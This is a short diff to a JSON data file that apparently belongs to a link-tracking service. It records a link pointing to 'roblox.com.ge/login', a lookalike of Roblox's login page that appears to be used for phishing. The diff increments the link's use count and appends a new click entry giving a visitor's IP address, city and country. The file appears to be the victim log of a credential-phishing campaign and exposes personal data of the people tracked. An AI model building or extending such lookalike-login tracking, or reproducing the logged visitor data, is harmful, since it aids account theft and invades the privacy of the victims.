@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1045,
+    "useCount": 1046,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8480,6 +8480,14 @@
         "city": "Manchester",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777236529519,
+        "ip": "173.40.230.133",
+        "country": "United States",
+        "city": "Gilroy",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
